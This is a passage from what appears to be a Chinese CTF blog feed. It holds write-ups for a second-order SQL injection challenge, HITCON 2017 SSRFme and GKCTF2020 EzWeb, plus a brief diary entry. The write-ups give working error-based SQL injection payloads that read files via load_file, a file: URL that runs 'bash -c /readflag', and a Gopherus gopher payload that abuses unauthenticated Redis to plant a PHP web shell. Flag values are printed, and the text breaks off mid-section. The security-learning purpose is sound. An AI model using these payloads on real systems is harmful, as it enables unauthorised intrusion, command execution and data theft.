string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$user_name</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$phone</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'no sql inject!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `user` where `user_name`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$user_name</span><span class="token punctuation">&#125;</span></span>' and `phone`='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$phone</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">;</span>        <span class="token variable">$fetch</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$fetch</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'error'</span><span class="token punctuation">;</span>            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"订单修改成功"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"未找到订单!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"信息不全"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>他这个是先把<code>adress</code>字段从数据库读出来之后又拼接到了更新语句中了，老地址的问题，可用老地址进行updaatexml报错注入。</p><p><strong>插入语句</strong><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>上面这里是<code>confirm.php</code>文件里面的插入数据库的语句。（PS：这里用了sql预处理语句，所以无法注入，应该是。）</p><p><strong>更新语句</strong><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `user` set `address`='"</span><span class="token punctuation">.</span><span class="token variable">$address</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"', `old_address`='"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"' where `user_id`="</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>注入</strong></p><blockquote><p>注意：updatexml报错注入最多一次只能查不到32个字符，算上前后两个<code>0x7e</code>就只剩下30个字符可以查询了。所以用下面的<code>substr()</code>函数分段注入。<br><code>payload为</code><br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p></blockquote><p><strong>注入原理</strong><br>这里的注入语句的构造原理主要就是，先插入的时候未对adress进行处理，但是后面更新订单的地方仍然没有进行处理，所以可能严格上来说不算是二次注入吧，但是这些词都是人造的，所以叫二次注入当然也没错。</p><p>如果我们一开始提交订单的时候提交的地址的值为<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>那我们接下来更新订单时的语句就变成了<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">set</span> <span class="token punctuation">`</span>address<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">where</span> user_id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#', `old_address`='.$row['address'].' where `user_id`=.$row['user_id'];</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>后面的大多数的内容都给注释掉了，只剩下了<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> <span class="token punctuation">`</span><span class="token keyword">user</span><span class="token punctuation">`</span> <span class="token keyword">set</span> <span class="token punctuation">`</span>address<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">where</span> user_id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>然后根据<code>updatexml报错注入</code>的原理，就是因为这里的<code>0x7e</code>的问题出现的报错注入。</p><p><strong>updatexml报错注入原理</strong><br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>由于updatexml的第二个参数需要Xpath格式的字符串，以<code>~</code>开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p></blockquote><h2 id="3-capture-the-flag"><a href="#3-capture-the-flag" class="headerlink" title="3.capture the flag"></a>3.capture the flag</h2><p>两次的<code>payload</code>分别为<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token string">'),1,30)),0x7e),1)#1'</span> <span class="token keyword">where</span> user_id<span class="token operator">=</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>当然也能用下面的<code>extractvalue报错注入</code><br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' where user_id=extractvalue(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token string">'),1,20)),0x7e));#1'</span> <span class="token keyword">where</span> user_id<span class="token operator">=</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><blockquote><p>attention:<code>extractvalue报错注入</code>、<code>updatexml报错注入</code>所依据的主要错误都是Xpath查询出现的格式错误。所以形式也都类似。</p></blockquote><p>这里的步骤可以是先提交有注入语句的address，后面用正常的地址改下订单就能报出错；<br>也可以是先提交正常的信息，然后改订单的时候先改地址为含有恶意代码的值，再改为正常值。~按说这里有addslashes函数，第二种应该不行的，但是确实也成功了。~都行，感觉第一种简单一些。<br>然后两次报错需提交的是两份订单，因为报错，所以如果只提交一份订单的话，第二次就根本修改不了地址，不行。</p><p><strong>flag</strong><br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;349dc15f-d73c-4e5e-91dd-1b01aa0ae474&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> updatexml报错注入 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON-2017-SSRFme</title>
      <link href="2020/11/03/HITCON-2017-SSRFme/"/>
      <url>2020/11/03/HITCON-2017-SSRFme/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>闲来静处，且将诗酒猖狂，唱一曲归来未晚，歌一调湖海茫茫       ——沈复《浮生六记》</p><p>今日网异云</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=516997458&auto=1&height=66"></iframe></blockquote><h2 id="1-源代码"><a href="#1-源代码" class="headerlink" title="1.源代码"></a>1.源代码</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);    @mkdir($sandbox);    @chdir($sandbox);    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>先创建一个目录<code>sandbox/md5(orange+你的ip)</code>，然后将传入的url使用<code>GET命令</code>去执行，再在解析<code>filename</code>参数，然后创建一个文件，并且将开始执行后的结果返回到这个文件。思路就是，先传访问一下?url=目录&amp;filename=随意，然后访问<code>/sandbox/你的md5结果</code>/随意，看返回的结果。</p></blockquote><p>读取文件测试<br><img src="/2020/11/03/HITCON-2017-SSRFme/1.png" alt><br>这里是你的ip地址<br><img src="/2020/11/03/HITCON-2017-SSRFme/2.png" alt><br><code>orange223.90.160.65</code>md5加密之后为<code>77653c231bd9d86116927c3bac2da423</code></p><p>然后第一次的payload为<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;&#x2F;etc&#x2F;passwd&amp;filename&#x3D;1&#x2F;sandbox&#x2F;77653c231bd9d86116927c3bac2da423&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><img src="/2020/11/03/HITCON-2017-SSRFme/3.png" alt></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;&#x2F;flag&amp;filename&#x3D;1&#x2F;sandbox&#x2F;77653c231bd9d86116927c3bac2da423&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个没回显，显然我们是不能靠这个读取到flag文件了。<br>然后<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;&#x2F;readflag&amp;filename&#x3D;1&#x2F;sandbox&#x2F;77653c231bd9d86116927c3bac2da423&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>可下载到<code>readflag</code>文件<br><img src="/2020/11/03/HITCON-2017-SSRFme/4.png" alt></p><h2 id="2-GET-file-gt-perl-open"><a href="#2-GET-file-gt-perl-open" class="headerlink" title="2.GET+file -&gt; perl+open"></a>2.GET+file -&gt; perl+open</h2><blockquote><p>GET命令是通过perl执行的；perl在open当中可以执行命令；<code>GET+file协议</code>触发<code>perl+open</code></p></blockquote><p>然后又有<code>bash -c &quot;命令&quot;</code>相当于直接在linux里面执行<code>命令</code>。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;file:bash%20-c%20&#x2F;readflag|&amp;filename&#x3D;1&#x2F;sandbox&#x2F;77653c231bd9d86116927c3bac2da423&#x2F;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/11/03/HITCON-2017-SSRFme/6.png" alt></p><p><strong>得flag</strong><br><img src="/2020/11/03/HITCON-2017-SSRFme/5.png" alt><br><pre class="line-numbers language-none"><code class="language-none">flag&#123;cdbd6821-9095-4b22-ad00-68614436812b&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生活杂记（一）</title>
      <link href="2020/11/01/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%AE%B01/"/>
      <url>2020/11/01/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>今日份网易云</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1412559986&auto=1&height=66"></iframe><p>懒散的时间总是让人不珍惜，今天的时间安排真的很松，事实上这种很松的时间规划已经过了有两天了，回想这两天到底做了什么，其实搞的实在的东西真的不多，甚至可以说非常少，那这到底是为什么呢？</p><p><strong>原因出在哪里？</strong></p><p>1.原因主要是没多少动力，最近的心情因为一些原因变得很糟，总是不自觉得想发会儿呆回想往事，再想到未来。。。<br>2.其次是晚上熬夜太晚，基于第一个原因产生，睡眠时间不足算是其中的一环吧。<br>3.然后就是不够沉浸于所做的事情，或是把时间浪费在了不重要的事情之上了。<br>4.没提前搞好时间安排。<br>5.有点不知所措。</p><p><strong>明天也许会好点吧</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-EZ三剑客-EzWeb</title>
      <link href="2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/"/>
      <url>2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>我心非石不可转，我心匪席不可卷。</p><iframe name="本地音频_春庭雪" src="./等什么君 - 春庭雪.mp3" marginwidth="1px" marginheight="20px" width="100%" height="80px" frameborder="1" 　scrolling="yes"></iframe><p>本地音频的访问速度太慢了呀。<br><strong>本地音频，不行；网易云，行。</strong></p></blockquote><h2 id="1-secret"><a href="#1-secret" class="headerlink" title="1./?secret"></a>1./?secret</h2><p>进去之后就给出了一个主页，我们可以查看源代码，然后就能看到一个很明显的提示<code>&lt;!--?secret--&gt;</code>，访问<code>?secret</code>得下面的ip信息，<br><pre class="line-numbers language-none"><code class="language-none">eth0      Link encap:Ethernet  HWaddr 02:42:0a:fc:b8:09            inet addr:10.252.184.9  Bcast:10.252.184.255  Mask:255.255.255.0          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1          RX packets:25 errors:0 dropped:0 overruns:0 frame:0          TX packets:24 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:4068 (4.0 KB)  TX bytes:4056 (4.0 KB)eth1      Link encap:Ethernet  HWaddr 02:42:ac:12:00:93            inet addr:172.18.0.147  Bcast:172.18.255.255  Mask:255.255.0.0          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:11 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:866 (866.0 B)  TX bytes:0 (0.0 B)lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:65536  Metric:1          RX packets:0 errors:0 dropped:0 overruns:0 frame:0          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>ip地址为<code>10.252.184.9</code></p><h2 id="2-file协议读取源码"><a href="#2-file协议读取源码" class="headerlink" title="2.file协议读取源码"></a>2.file协议读取源码</h2><p>然后可以用file协议读取一下源代码我们要让我们搜索的内容为<code>file:/etc/passwd</code>即可读取，如下图<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/1.png" alt></p><p>index.php<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpfunction curl($url)&#123;      $ch &#x3D; curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    echo curl_exec($ch);    curl_close($ch);&#125;if(isset($_GET[&#39;submit&#39;]))&#123;$url &#x3D; $_GET[&#39;url&#39;];&#x2F;&#x2F;echo $url.&quot;\n&quot;;if(preg_match(&#39;&#x2F;file\:\&#x2F;\&#x2F;|dict|\.\.\&#x2F;|127.0.0.1|localhost&#x2F;is&#39;, $url,$match))&#123;&#x2F;&#x2F;var_dump($match);die(&#39;别这样&#39;);&#125;curl($url);&#125;if(isset($_GET[&#39;secret&#39;]))&#123;system(&#39;ifconfig&#39;);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/2.png" alt></p><h2 id="3-用http协议配合bp进行内网主机探测"><a href="#3-用http协议配合bp进行内网主机探测" class="headerlink" title="3.用http协议配合bp进行内网主机探测"></a>3.用http协议配合bp进行内网主机探测</h2><p>上面过滤掉的协议有<br><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;dict<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>还过滤了<code>127.0.0.1</code>和<code>localhost</code>这两个，还有个<code>is</code>（暂不知道哪个姿势可以利用到）。</p><p>那还没有过滤的协议还有<code>gopher和http协议</code>，用<code>http协议</code>可进行内网主机存活检测，火狐配合bp实现爆破<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/3.png" alt><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/4.png" alt><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/5.png" alt></p><p><strong>可见存在redis的主机为<code>10.252.184.11</code></strong><br>用<code>nmap</code>爆破出<code>6379</code>的<code>redis</code>端口:<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/7.png" alt><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/8.png" alt><br>不知道为啥，不指定<code>6379端口</code>就扫不出来Redis服务。<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/6.png" alt><br><pre class="line-numbers language-none"><code class="language-none">nmap -sV 9969ab83-1446-441e-808a-02a5793215c5.node3.buuoj.cn -p 6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>可以发现确实有redis服务，<code>利用redis未授权访问的漏洞，在根目录下生成个文件shell.php</code>。</p><p>可以用下面的办法来制造<code>shell.php</code>。</p><h2 id="4-gopherus制造shell"><a href="#4-gopherus制造shell" class="headerlink" title="4.gopherus制造shell"></a>4.gopherus制造shell</h2><p>工具的下载链接为<a href="https://github.com/tarunkant/Gopherus">Gopherus下载GitHub</a>。</p><p><strong>怎么装Gopherus？</strong><br>下载后，拉到kali里面，<code>sh install.php</code>，如果报错，可先改一下<code>install.php</code><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/9.png" alt></p><p>完成安装工具之后，使用下面的命令生成<code>shell</code>：<br><pre class="line-numbers language-none"><code class="language-none">gopherus --exploit redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/10.png" alt></p><p><code>&lt;?php echo system(&quot;cat /flag&quot;);?&gt;</code></p><pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>上面这样肯定不行了啦，因为我们的关键词<code>127.0.0.1</code>被过滤了嘛，而且好像还是得用我们的Redis主机服务的ip。。。</strong></p><p>ip更换为内网Redis主机的ip为<code>10.252.184.11</code><br><pre class="line-numbers language-none"><code class="language-none">gopher:&#x2F;&#x2F;10.252.184.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/11.png" alt></p><h2 id="5-得flag"><a href="#5-得flag" class="headerlink" title="5.得flag"></a>5.得flag</h2><p><img 